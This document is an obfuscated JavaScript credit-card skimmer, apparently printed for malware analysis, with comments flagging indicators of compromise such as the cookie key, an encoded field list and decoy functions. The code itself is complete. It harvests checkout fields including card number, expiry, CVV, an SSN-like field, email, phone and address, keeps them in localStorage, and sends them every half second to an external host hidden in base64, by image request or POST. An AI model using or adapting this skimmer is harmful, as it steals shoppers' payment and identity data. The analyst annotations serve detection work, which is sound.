function _0xfd2f(_0x4cbd43, _0x26cb82) {
  var _0x472006 = _0x4720();
  return _0xfd2f = function(_0xfd2ff5, _0x5a7bba) {
    _0xfd2ff5 = _0xfd2ff5 - 0xd3;
    var _0x54210b = _0x472006[_0xfd2ff5];
    return _0x54210b;
  }, _0xfd2f(_0x4cbd43, _0x26cb82);
}
var _0x4d5ab1 = _0xfd2f;
(function(_0x49367b, _0x1e07e3) {
  var _0x31a4f3 = _0xfd2f,
    _0x5f409f = _0x49367b();
  while (!![]) {
    try {
      var _0x5d4f33 = parseInt(_0x31a4f3(0x108)) / 0x1 * (parseInt(_0x31a4f3(
          0xf6)) / 0x2) + -parseInt(_0x31a4f3(0x118)) / 0x3 * (-parseInt(
          _0x31a4f3(0xe1)) / 0x4) + -parseInt(_0x31a4f3(0xef)) / 0x5 * (
          parseInt(_0x31a4f3(0x105)) / 0x6) + -parseInt(_0x31a4f3(0x10f)) /
        0x7 * (-parseInt(_0x31a4f3(0xfc)) / 0x8) + -parseInt(_0x31a4f3(
        0x101)) / 0x9 + parseInt(_0x31a4f3(0x10d)) / 0xa + -parseInt(
          _0x31a4f3(0xe8)) / 0xb * (parseInt(_0x31a4f3(0x11d)) / 0xc);
      if (_0x5d4f33 === _0x1e07e3) break;
      else _0x5f409f['push'](_0x5f409f['shift']());
    } catch (_0x14d45e) {
      _0x5f409f['push'](_0x5f409f['shift']());
    }
  }
}(_0x4720, 0xe52d9));

/*
 * Several IoCs in this array that can be used to identify this specific script:
 * 1. bmmuw: the name of the cookie key - unique enough to be unused elsewhere.
 * 2. vnskp_param set to the value 'hash' later and is used in the URL.
 * 3. The base64 encoded URL as the last element. URLs are common IoCs.
 */
function _0x4720() {
  var _0x3ddb09 = ['vnskp_type', '34472647ZfYNqD', 'yxkxl', 'toString',
    'innerText', 'rkrhv', 'phone', 'wwtlq', '45XOedQO', 'lqbjn', 'length',
    'default_billing', 'selectedOptions', 'parse', 'region', '34ctScIO',
    'mepgq', 'forEach', 'Holder', 'vnskp', 'scnhm', '16ZjpFvE', 'object',
    'bmmuw', 'blfoi', 'country', '3986424sIJGeN', 'value', 'city', 'JSON',
    '570264RcISWA', 'qwyjy', 'replace', '101221cMBWHB', 'slice', 'firstname',
    'liluj', 'country_id', '13699150SOIvNk', 'awcsb', '4994892xjGFUw',
    'getElementsByTagName', 'Domain', 'IMG', 'fromCharCode', 'addresses',
    'yqgnj', 'wsmlv', 'undefined', '12246bODdzt', 'setInterval', 'wyhyj',
    'select', 'ycsnm', '12gmYQLy', 'createElement', 'stringify', 'state',
    'textarea', 'input', 'querySelector', 'append', 'indexOf', 'lytgk', 'zip',
    'lastname', 'push', 'localStorage', 'zytth', 'vnskp_param', 'POST',
    'vqmub', 'sfofx', 'hasAttribute', 'random', 'getItem', 'setItem', 'trim',
    'nsvus', 'janyb', '836bnvckL', 'street', 'postcode', 'attributes', 'src',
    'aHR0cHM6Ly9jZG4tcmVwb3J0LmNvbS9zdGF0dXMv'
  ];
  _0x4720 = function() {
    return _0x3ddb09;
  };
  return _0x4720();
}
var xfkwf = {};
xfkwf[_0x4d5ab1(0xd5)] = function(_0x59e75c) {
    var _0x3510bf = _0x4d5ab1;
    /*
     * IoCs: btoa() and atob() handle base64 encoded data, which is a common
     * practice in malware as a way to hide information, especially information
     * going over a wire that could be monitored by an IDS/IPS or WAF. Base64 is
     * used in normal operations, so on it's own cannot be used to categorise
     * activity as malicious, but can be combined with other IoCs.
     */
    return btoa(encodeURIComponent(_0x59e75c)[_0x3510bf(0x107)](
      /%([0-9A-F]{2})/g, function(_0x5c6ecd, _0x36bb0a) {
        var _0xaebe5 = _0x3510bf;
        return String[_0xaebe5(0x113)]('0x' + _0x36bb0a);
      }));
  }, xfkwf[_0x4d5ab1(0x116)] = function(_0x1fdc44) {
    var _0x47fb3d = _0x4d5ab1,
      _0x53193b = atob(_0x1fdc44),
      _0x4bd8d1 = '';
    for (var _0x3afa83 = 0x0; _0x3afa83 < _0x53193b[_0x47fb3d(
      0xf1)]; _0x3afa83++) {
      _0x4bd8d1 += '%' + ('00' + _0x53193b[_0x3afa83]['charCodeAt'](0x0)[
        _0x47fb3d(0xea)](0x10))[_0x47fb3d(0x109)](-0x2);
    }
    return decodeURIComponent(_0x4bd8d1);
  }, xfkwf[_0x4d5ab1(0xf0)] = document, xfkwf['sfofx'] =
  /*
   * IoC: this is a base64 encoded JSON array containing the list of items the
   * script should look for. It is hardcoded and therefore can be used as an IoC
   * to identify this specific version of this script. Fuzzy matching could be
   * used to account for changes to this array in future versions of the script
   * (if there are any) where the array is modified.
   */
  'W1siaWQiLCAiaW5wdXQtcGF5bWVudC1maXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtZmlyc3RuYW1lIiwgMCwgImYiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtbGFzdG5hbWUiLCAwLCAibCIsICJIb2xkZXIiXSwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibiIsICJOdW1iZXIiXSwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibSIsICJEYXRlIl0sIFsiZmllbGQiLCAiaWZyYW1lIiwgMCwgInkiLCAiRGF0ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNWViJdLCBbImlkIiwgImlucHV0LWNjLW93bmVyIiwgMCwgImgiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtY2MtbnVtYmVyIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsiaWQiLCAiaW5wdXQtY2MtZXhwaXJlLWRhdGUiLCAwLCAibSIsICJEYXRlIl0sIFsibmFtZSIsICJjY19leHBpcmVfZGF0ZV95ZWFyIiwgMCwgInkiLCAiRGF0ZSJdLCBbImlkIiwgImlucHV0LWNjLWN2djIiLCAwLCAiYyIsICJDVlYiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWN1c3RvbS1maWVsZDQiLCAwLCAic24iLCAic3NuIl0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC1lbWFpbCIsIDAsICJlbCIsICJlbWFpbCJdLCBbImlkIiwgImlucHV0LWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC10ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJpZCIsICJpbnB1dC10ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWNpdHkiLCAwLCAiY3kiLCAiY2l0eSJdLCBbImlkIiwgImlucHV0LXBheW1lbnQtY291bnRyeSIsIDMsICJjdCIsICJjb3VudHJ5Il0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC1wb3N0Y29kZSIsIDAsICJ6cCIsICJ6aXAiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LXpvbmUiLCAzLCAic3QiLCAic3RhdGUiXSwgWyJpZCIsIFsiaW5wdXQtcGF5bWVudC1hZGRyZXNzLTEiLCAiaW5wdXQtcGF5bWVudC1hZGRyZXNzLTIiXSwgMCwgImFzIiwgImFkZHIiXV0=',
  xfkwf[_0x4d5ab1(0x10b)] = _0x4d5ab1(0xe6), xfkwf[_0x4d5ab1(0xfb)] = window[
    'JSON'][_0x4d5ab1(0xf4)](xfkwf[_0x4d5ab1(0x116)](xfkwf[_0x4d5ab1(0xd9)])),
  xfkwf[_0x4d5ab1(0x10e)] = {}, xfkwf[_0x4d5ab1(0xec)] = [], xfkwf[_0x4d5ab1(
    0xdf)] = _0x4d5ab1(0xfe), xfkwf[_0x4d5ab1(0xe7)] = 0x0, xfkwf[
  'vnskp_param'] = 'hash', xfkwf['qwyjy'] = function() {
    var _0x5ebb97 = _0x4d5ab1,
      _0x37be03 = xfkwf[_0x5ebb97(0xf0)][_0x5ebb97(0x110)](_0x5ebb97(0x122)),
      _0x3a1440 = xfkwf[_0x5ebb97(0xf0)][_0x5ebb97(0x110)](_0x5ebb97(0x11b)),
      _0x2bedca = xfkwf[_0x5ebb97(0xf0)][_0x5ebb97(0x110)](_0x5ebb97(0x121));
    for (var _0x1232d1 = 0x0; _0x1232d1 < _0x37be03[_0x5ebb97(
      0xf1)]; _0x1232d1++) xfkwf['ycsnm'](_0x37be03[_0x1232d1]);
    for (var _0x1232d1 = 0x0; _0x1232d1 < _0x3a1440['length']; _0x1232d1++)
      xfkwf['ycsnm'](_0x3a1440[_0x1232d1]);
    for (var _0x1232d1 = 0x0; _0x1232d1 < _0x2bedca[_0x5ebb97(
      0xf1)]; _0x1232d1++) xfkwf['ycsnm'](_0x2bedca[_0x1232d1]);
    xfkwf[_0x5ebb97(0x10e)][_0x5ebb97(0x111)] = location['host'];
  }, xfkwf[_0x4d5ab1(0x11c)] = function(_0x811535) {
    var _0x14b009 = _0x4d5ab1;
    for (var _0x3ec9e8 = 0x0; _0x3ec9e8 < xfkwf[_0x14b009(0xfb)][
      'length']; _0x3ec9e8++) {
      var _0x33d39c = xfkwf['scnhm'][_0x3ec9e8];
      if (_0x811535[_0x14b009(0xda)](_0x33d39c[0x0])) {
        if (typeof _0x33d39c[0x1] == _0x14b009(0xfd)) {
          var _0x3a4a7a = '';
          _0x33d39c[0x1][_0x14b009(0xf8)](function(_0x3d085c) {
            var _0x398c2d = _0x14b009,
              _0x3ce390 = document[_0x398c2d(0x123)]('[' + _0x33d39c[0x0] +
                '=\x22' + _0x3d085c + '\x22' + ']');
            _0x3ce390 != null && xfkwf[_0x398c2d(0xee)](_0x3ce390,
              _0x33d39c[0x2])[_0x398c2d(0xf1)] > 0x0 && (_0x3a4a7a +=
              xfkwf[_0x398c2d(0xee)](_0x3ce390, _0x33d39c[0x2]) + '\x20');
          }), xfkwf[_0x14b009(0x10e)][_0x33d39c[0x4]] = _0x3a4a7a[_0x14b009(
            0xde)]();
        } else {
          if (_0x811535[_0x14b009(0xe4)][_0x33d39c[0x0]][_0x14b009(0x102)] ==
            _0x33d39c[0x1] && xfkwf[_0x14b009(0xee)](_0x811535, _0x33d39c[0x2])[
              _0x14b009(0xf1)] > 0x0) {
            if (_0x33d39c[0x3] == 'l') xfkwf['awcsb'][_0x33d39c[0x4]] +=
              '\x20' + xfkwf[_0x14b009(0xee)](_0x811535, _0x33d39c[0x2]);
            else {
              if (_0x33d39c[0x3] == 'y') xfkwf[_0x14b009(0x10e)][_0x33d39c[
                0x4]] += '/' + xfkwf[_0x14b009(0xee)](_0x811535, _0x33d39c[
                0x2]);
              else xfkwf[_0x14b009(0x10e)][_0x33d39c[0x4]] = xfkwf[_0x14b009(
                0xee)](_0x811535, _0x33d39c[0x2]);
            }
          }
        }
      }
    }
  }, xfkwf[_0x4d5ab1(0x11a)] = function(_0x1f12ef, _0x36855e) {
    var _0x3e9bd7 = _0x4d5ab1;
    if (_0x1f12ef['hasAttribute'](_0x36855e) && _0x1f12ef[_0x3e9bd7(0xe4)][
        _0x36855e
      ][_0x3e9bd7(0x102)][_0x3e9bd7(0xf1)] > 0x0 && _0x1f12ef[_0x3e9bd7(0x102)][
        _0x3e9bd7(0xf1)
      ] > 0x0 && _0x1f12ef['value'][_0x3e9bd7(0xf1)] < 0x100) return !![];
    return ![];
  }, xfkwf[_0x4d5ab1(0xee)] = function(_0x26f4c6, _0x105c29) {
    var _0x320dc4 = _0x4d5ab1;
    switch (_0x105c29) {
      case 0x0:
        return _0x26f4c6[_0x320dc4(0x102)]['trim']();
      case 0x1:
        return _0x26f4c6['innerHTML'][_0x320dc4(0xde)]();
      case 0x2:
        return _0x26f4c6['innerText'][_0x320dc4(0xde)]();
      case 0x3:
        if (_0x26f4c6['value']['length'] > 0x0) return _0x26f4c6[_0x320dc4(
          0xf3)][0x0][_0x320dc4(0xeb)];
        else return '';
    }
  }, xfkwf[_0x4d5ab1(0x126)] = function() {
    var _0xd0e6cb = _0x4d5ab1;
    for (var _0x237983 = 0x0; _0x237983 < xfkwf[_0xd0e6cb(0xfb)][
      'length']; _0x237983++) {
      var _0x4c51fc = xfkwf['scnhm'][_0x237983];
      if (_0x4c51fc[0x3] == 'n' && (typeof xfkwf['awcsb'][_0x4c51fc[0x4]] ==
          _0xd0e6cb(0x117) || xfkwf['awcsb'][_0x4c51fc[0x4]][_0xd0e6cb(0xf1)] <
          0xb)) return ![];
      if ((_0x4c51fc[0x3] == 'h' || _0x4c51fc[0x3] == 'f' || _0x4c51fc[0x3] ==
          'l') && (typeof xfkwf[_0xd0e6cb(0x10e)][_0x4c51fc[0x4]] == _0xd0e6cb(
            0x117) || xfkwf[_0xd0e6cb(0x10e)][_0x4c51fc[0x4]][_0xd0e6cb(
          0xf1)] == 0x0)) return ![];
      if ((_0x4c51fc[0x3] == 'e' || _0x4c51fc[0x3] == 'm' || _0x4c51fc[0x3] ==
          'y') && (typeof xfkwf[_0xd0e6cb(0x10e)][_0x4c51fc[0x4]] == _0xd0e6cb(
          0x117) || xfkwf[_0xd0e6cb(0x10e)][_0x4c51fc[0x4]]['length'] == 0x0))
        return ![];
      if (_0x4c51fc[0x3] == 'c' && (typeof xfkwf[_0xd0e6cb(0x10e)][_0x4c51fc[
            0x4]] == _0xd0e6cb(0x117) || xfkwf[_0xd0e6cb(0x10e)][_0x4c51fc[0x4]]
          ['length'] < 0x3)) return ![];
    }
    return !![];
  }, xfkwf[_0x4d5ab1(0xe9)] = function(_0x2007d3) {
    var _0x162d55 = _0x4d5ab1;
    return xfkwf[_0x162d55(0xec)][_0x162d55(0x125)](_0x2007d3) != -0x1;
  }, xfkwf['blfoi'] = function() {
    var _0xd5498d = _0x4d5ab1;
    xfkwf[_0xd5498d(0x106)](), xfkwf[_0xd5498d(0xf7)](), xfkwf['janyb'](),
      xfkwf[_0xd5498d(0xfa)](), xfkwf[_0xd5498d(0xd8)]();
  }, xfkwf[_0x4d5ab1(0xfa)] = function() {
    var _0x4dcc4c = _0x4d5ab1,
      _0x1cdb15 = xfkwf[_0x4dcc4c(0xd5)](window[_0x4dcc4c(0x104)][_0x4dcc4c(
        0x11f)](xfkwf[_0x4dcc4c(0x10e)]));
    if (xfkwf[_0x4dcc4c(0x126)]() && !xfkwf['yxkxl'](_0x1cdb15)) {
      xfkwf[_0x4dcc4c(0xec)][_0x4dcc4c(0xd3)](_0x1cdb15);
      if (xfkwf['vnskp_type'] == 0x0) {
        var _0x31a36b = xfkwf[_0x4dcc4c(0xf0)][_0x4dcc4c(0x11e)](_0x4dcc4c(
          0x112));
        _0x31a36b[_0x4dcc4c(0xe5)] = xfkwf[_0x4dcc4c(0x116)](xfkwf[_0x4dcc4c(
          0x10b)]) + '?' + xfkwf[_0x4dcc4c(0xd6)] + '=' + _0x1cdb15;
      }
      if (xfkwf[_0x4dcc4c(0xe7)] == 0x1) {
        var _0x48fd7e = new FormData();
        _0x48fd7e[_0x4dcc4c(0x124)](xfkwf['vnskp_param'], _0x1cdb15), fetch(
          xfkwf[_0x4dcc4c(0x116)](xfkwf[_0x4dcc4c(0x10b)]) + '?' + Math[
            _0x4dcc4c(0xdb)](), {
            'method': _0x4dcc4c(0xd7),
            'body': _0x48fd7e
          });
      }
    }
  }, xfkwf[_0x4d5ab1(0xd8)] = function() {
    var _0x47edb5 = _0x4d5ab1,
      _0x3ac81b = xfkwf['zytth'](window[_0x47edb5(0x104)][_0x47edb5(0x11f)](
        xfkwf['awcsb']));
    window[_0x47edb5(0xd4)][_0x47edb5(0xdd)](xfkwf[_0x47edb5(0xdf)], _0x3ac81b);
  }, xfkwf[_0x4d5ab1(0x115)] = function() {
    var _0x31ecae = _0x4d5ab1,
      _0x5b484b = window['localStorage'][_0x31ecae(0xdc)](xfkwf[_0x31ecae(
        0xdf)]);
    _0x5b484b !== null && (xfkwf[_0x31ecae(0x10e)] = window[_0x31ecae(0x104)][
      _0x31ecae(0xf4)
    ](xfkwf[_0x31ecae(0x116)](_0x5b484b)));
  /*
   * Empty functions are an example of anti-reverse engineering techniques to
   * add noise to the script.
   */
  }, xfkwf[_0x4d5ab1(0xf7)] = function() {}, xfkwf[_0x4d5ab1(0xe0)] =
function() {
    var _0x43d719 = _0x4d5ab1;
    /*
     * IoC: customerData != 'undefined', not necessarily suspicious in itself,
     * but can be combined with other IoCs to identify this script.
     */
    if (typeof customerData != 'undefined') {
      if (typeof customerData[_0x43d719(0xf2)] != undefined && customerData[
          _0x43d719(0xf2)] != null) {
        if (typeof customerData[_0x43d719(0x114)][customerData[_0x43d719(
          0xf2)]] != undefined) {
          var _0x243c6e = customerData[_0x43d719(0x114)][customerData[_0x43d719(
            0xf2)]];
          xfkwf['awcsb'][_0x43d719(0x100)] = _0x243c6e[_0x43d719(0x10c)], xfkwf[
              _0x43d719(0x10e)][_0x43d719(0x103)] = _0x243c6e[_0x43d719(0x103)],
            xfkwf[_0x43d719(0x10e)][_0x43d719(0x120)] = _0x243c6e['region'][
              _0x43d719(0xf5)
            ], xfkwf['awcsb'][_0x43d719(0xed)] = _0x243c6e['telephone'], xfkwf[
              _0x43d719(0x10e)]['addr'] = _0x243c6e[_0x43d719(0xe2)]['join'](
              ','), xfkwf[_0x43d719(0x10e)][_0x43d719(0x127)] = _0x243c6e[
              _0x43d719(0xe3)], xfkwf[_0x43d719(0x10e)][_0x43d719(0xf9)] =
            _0x243c6e[_0x43d719(0x10a)] + '\x20' + _0x243c6e[_0x43d719(0x128)];
        }
      }
    }
  }, xfkwf[_0x4d5ab1(0x115)](), window[_0x4d5ab1(0x119)](xfkwf[_0x4d5ab1(0xff)],
    0x1f4);
